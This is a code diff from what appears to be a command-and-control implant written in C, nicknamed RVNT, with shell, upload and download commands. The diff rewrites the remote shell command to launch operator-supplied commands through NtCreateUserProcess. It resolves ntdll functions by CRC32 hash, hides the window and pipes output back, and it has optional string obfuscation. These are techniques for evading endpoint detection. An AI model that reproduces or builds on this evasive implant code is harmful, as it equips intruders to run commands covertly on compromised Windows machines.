@@ -10,10 +10,7 @@
 
 #include <tchar.h>
 
-
 #define RVNT_COMMAND_LENGTH 5
-
-
 
 RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
@@ -125,6 +122,11 @@ VOID CommandDispatcher() {
 
 VOID CommandShell( PPARSER Parser ){
 
+#if CONFIG_ARCH == x64
+    void *p_ntdll = get_ntdll_64();
+#else
+    void *p_ntdll = get_ntdll_32();
+#endif //CONFIG_ARCH
 //--------------------------------
 #if CONFIG_OBFUSCATION
     unsigned char s_xk[] = S_XK;
@@ -133,7 +135,146 @@ VOID CommandShell( PPARSER Parser ){
 #else
     _tprintf("Command::Shell\n");
 #endif
-//--------------------------------
+//---------------------------------
+#if CONFIG_NATIVE
+
+    DWORD   Length           = 0;
+    PCHAR   Command          = NULL;
+    HANDLE  hStdInPipeRead   = NULL;
+    HANDLE  hStdInPipeWrite  = NULL;
+    HANDLE  hStdOutPipeRead  = NULL;
+    HANDLE  hStdOutPipeWrite = NULL;
+
+    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
+
+    Command = ParserGetBytes(Parser, (PUINT32) &Length);
+
+    if (CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
+        return;
+
+    if (CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
+        return;
+
+    UNICODE_STRING nt_image_path;
+    UNICODE_STRING nt_args;
+    UNICODE_STRING nt_command_line;
+
+    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
+    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
+
+    // hardcoded test string
+    //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
+
+
+    // split command and args
+    char command_str[MAX_PATH];
+    char arg_str[MAX_PATH];
+
+    // copy command line (cmd.exe /c XXXXX)
+    mem_cpy(command_str,Command,Length);
+
+    // split command line
+    char ** command_array = split_first_space(command_str);
+
+    // get command file path
+    char * cmd_file = str_dup(command_array[0]);
+
+    // get args
+    mem_cpy(arg_str,command_array[1],str_len(command_array[1]));
+    arg_str[str_len(command_array[1])] = 0x0;
+
+    // normalize command file path
+    normalize_path(cmd_file);
+
+    // make wide command and args
+    PWSTR wide_command = str_to_wide(cmd_file);
+    PWSTR wide_args = str_to_wide(arg_str);
+
+    // make the command line
+    PWCHAR command_line = wide_concat(wide_concat(wide_command, L" "),wide_args);
+
+    // unicode str
+    g_rtl_init_unicode_string(&nt_image_path, wide_command);
+    g_rtl_init_unicode_string(&nt_args, wide_args);
+    //g_rtl_init_unicode_string(&nt_command_line, command_line);
+
+    //_tprintf("Command Line:%ls\n", command_line);
+
+    PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };
+
+    // create process params struct
+    void *p_rtl_create_process_parameters_ex = get_proc_address_by_hash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
+    RtlCreateProcessParametersEx_t g_rtl_create_process_parameters_ex = (RtlCreateProcessParametersEx_t) p_rtl_create_process_parameters_ex;
+    g_rtl_create_process_parameters_ex(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);
+
+    // create info struct
+    PS_CREATE_INFO create_info = { 0 };
+    create_info.Size = sizeof(create_info);
+    create_info.State = PsCreateInitialState;
+
+    // set some parameters
+    proc_params->CommandLine.Buffer = command_line;
+    proc_params->CommandLine.Length = MAX_PATH;
+    proc_params->WindowFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // Hide Window 0x00000001 | Use STD handles 0x100
+
+    // Setup handle array
+    HANDLE handle_array[3] = { hStdInPipeRead, hStdOutPipeWrite, hStdOutPipeWrite };
+
+
+    // set std error/out/in:
+    proc_params->StandardError   = handle_array[2];
+    proc_params->StandardOutput  = handle_array[1];
+    proc_params->StandardInput   = handle_array[0];
+
+
+    // allocate process heap
+    void *p_rtl_allocate_heap = get_proc_address_by_hash(p_ntdll, RtlAllocateHeap_CRC32B);
+    RtlAllocateHeap_t g_rtl_allocate_heap = (RtlAllocateHeap_t) p_rtl_allocate_heap;
+
+    // get heaps
+    void *p_rtl_get_process_heaps = get_proc_address_by_hash(p_ntdll, RtlGetProcessHeaps_CRC32B);
+    RtlGetProcessHeaps_t g_rtl_get_process_heaps = (RtlGetProcessHeaps_t) p_rtl_get_process_heaps;
+
+    // make attributes
+    OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
+    PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
+    PCLIENT_ID client_id = (PCLIENT_ID)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+    PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
+
+    attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - (sizeof(PS_ATTRIBUTE));
+    attrib_list->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
+    attrib_list->Attributes[0].Size = nt_image_path.Length;
+    attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;
+
+    NTSTATUS status;
+    HANDLE h_proc, h_thread = NULL;
+    void *p_nt_create_user_process = get_proc_address_by_hash(p_ntdll, NtCreateUserProcess_CRC32B);
+    NtCreateUserProcess_t g_nt_create_user_process = (NtCreateUserProcess_t) p_nt_create_user_process;
+    if((status = g_nt_create_user_process(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
+        _tprintf("PROCESS CREATION FAILED!\n");
+        _tprintf("STATUS:%08x\n", status);
+    }
+    void *p_rtl_free_heap = get_proc_address_by_hash(p_ntdll, RtlFreeHeap_CRC32B);
+    RtlFreeHeap_t g_rtl_free_heap = (RtlFreeHeap_t) p_rtl_free_heap;
+    g_rtl_free_heap(RtlProcessHeap(), 0, attrib_list);
+    g_rtl_free_heap(RtlProcessHeap(), 0, sec_img_info);
+    g_rtl_free_heap(RtlProcessHeap(), 0, client_id);
+
+    void *p_rtl_destroy_process_parameters = get_proc_address_by_hash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
+    RtlDestroyProcessParameters_t g_rtl_destroy_process_parameters = (RtlDestroyProcessParameters_t) p_rtl_destroy_process_parameters;
+    g_rtl_destroy_process_parameters(proc_params);
+
+    CloseHandle( hStdOutPipeWrite );
+    CloseHandle( hStdInPipeRead );
+
+    AnonPipeRead( hStdOutPipeRead );
+
+    CloseHandle( hStdOutPipeRead );
+    CloseHandle( hStdInPipeWrite );
+
+#else
+
     DWORD   Length           = 0;
     PCHAR   Command          = NULL;
     HANDLE  hStdInPipeRead   = NULL;
@@ -154,103 +295,14 @@ VOID CommandShell( PPARSER Parser ){
         return;
 
     StartUpInfoA.cb         = sizeof( STARTUPINFOA );
+
     StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
     StartUpInfoA.hStdError  = hStdOutPipeWrite;
     StartUpInfoA.hStdOutput = hStdOutPipeWrite;
     StartUpInfoA.hStdInput  = hStdInPipeRead;
 
-#if CONFIG_NATIVE
-#if CONFIG_ARCH == x64
-    void *p_ntdll = get_ntdll_64();
-#else
-    void *p_ntdll = get_ntdll_32();
-#endif //CONFIG_ARCH
-
-    UNICODE_STRING nt_image_path;
-    UNICODE_STRING nt_args;
-    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
-    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
-
-    //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
-
-
-    char command_str[MAX_PATH];
-    char arg_str[MAX_PATH];
-
-    mem_cpy(command_str,Command,Length);
-
-
-    char ** command_array = split_first_space(command_str);
-    char * cmd_file = str_dup(command_array[0]);
-
-    mem_cpy(arg_str,command_array[1],str_len(command_array[1]));
-    arg_str[str_len(command_array[1])] = 0x0;
-
-    normalize_path(cmd_file);
-
-    PWSTR wide_command = str_to_wide(cmd_file);
-    PWSTR wide_args = str_to_wide(arg_str);
-
-    g_rtl_init_unicode_string(&nt_image_path, wide_command);
-    g_rtl_init_unicode_string(&nt_args, wide_args);
-
-    /*
-    _tprintf("Command [0] :%s\n",command_array[0]);
-    _tprintf("Command [1] :%s\n",command_array[1]);
-    _tprintf("Wide Command:%ls\n",wide_command);
-    _tprintf("Wide Args:%ls\n",wide_args);
-    */
-    PWCHAR command_line = wide_concat(wide_concat(wide_command, L" "),wide_args);
-    //_tprintf("Command Line:%ls\n", command_line);
-
-    PRTL_USER_PROCESS_PARAMETERS proc_params = NULL;
-
-
-    void *p_rtl_create_process_parameters_ex = get_proc_address_by_hash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
-    RtlCreateProcessParametersEx_t g_rtl_create_process_parameters_ex = (RtlCreateProcessParametersEx_t) p_rtl_create_process_parameters_ex;
-    g_rtl_create_process_parameters_ex(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);
-
-    PS_CREATE_INFO create_info = { 0 };
-    create_info.Size = sizeof(create_info);
-    create_info.State = PsCreateInitialState;
-
-    proc_params->CommandLine.Buffer = command_line;
-    proc_params->CommandLine.Length = MAX_PATH;
-    proc_params->WindowFlags = 0x00000001; // Hide Window
-
-    void *p_rtl_allocate_heap = get_proc_address_by_hash(p_ntdll, RtlAllocateHeap_CRC32B);
-    RtlAllocateHeap_t g_rtl_allocate_heap = (RtlAllocateHeap_t) p_rtl_allocate_heap;
-
-    void *p_rtl_get_process_heaps = get_proc_address_by_hash(p_ntdll, RtlGetProcessHeaps_CRC32B);
-    RtlGetProcessHeaps_t g_rtl_get_process_heaps = (RtlGetProcessHeaps_t) p_rtl_get_process_heaps;
-
-    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
-    attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
-    attrib_list->Attributes[0].Attribute = 0x20005;
-    attrib_list->Attributes[0].Size = nt_image_path.Length;
-    attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;
-
-    NTSTATUS status;
-    HANDLE h_proc, h_thread = NULL;
-    void *p_nt_create_user_process = get_proc_address_by_hash(p_ntdll, NtCreateUserProcess_CRC32B);
-    NtCreateUserProcess_t g_nt_create_user_process = (NtCreateUserProcess_t) p_nt_create_user_process;
-    if((status = g_nt_create_user_process(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, 0, 0, proc_params, &create_info, attrib_list)) != 0x0) {
-        _tprintf("PROCESS CREATION FAILED!\n");
-        _tprintf("STATUS:%08x\n", status);
-        return;
-    }
-    void *p_rtl_free_heap = get_proc_address_by_hash(p_ntdll, RtlFreeHeap_CRC32B);
-    RtlFreeHeap_t g_rtl_free_heap = (RtlFreeHeap_t) p_rtl_free_heap;
-    g_rtl_free_heap(RtlProcessHeap(), 0, attrib_list);
-
-    void *p_rtl_destroy_process_parameters = get_proc_address_by_hash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
-    RtlDestroyProcessParameters_t g_rtl_destroy_process_parameters = (RtlDestroyProcessParameters_t) p_rtl_destroy_process_parameters;
-    g_rtl_destroy_process_parameters(proc_params);
-
-#else
     if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
         return;
-#endif
 
     CloseHandle( hStdOutPipeWrite );
     CloseHandle( hStdInPipeRead );
@@ -259,6 +311,8 @@ VOID CommandShell( PPARSER Parser ){
 
     CloseHandle( hStdOutPipeRead );
     CloseHandle( hStdInPipeWrite );
+#endif // CONFIG_NATIVE
+
 }
 
 VOID CommandUpload( PPARSER Parser ) {
@@ -338,7 +392,6 @@ VOID CommandUpload( PPARSER Parser ) {
     Cleanup:
     CloseHandle(hFile);
     hFile = NULL;
-}
 
 #else //CONFIG_NATIVE
 
@@ -375,8 +428,9 @@ VOID CommandUpload( PPARSER Parser ) {
     Cleanup:
     CloseHandle( hFile );
     hFile = NULL;
+#endif // CONFIG_NATIVE
 }
-#endif
+
 
 
 VOID CommandDownload( PPARSER Parser ) {
@@ -512,7 +566,7 @@ VOID CommandDownload( PPARSER Parser ) {
     }
 
     if ( Content ){
-        memset( Content, 0, FileSize );
+        mem_set( Content, 0, FileSize );
         LocalFree( Content );
         Content = NULL;
     }
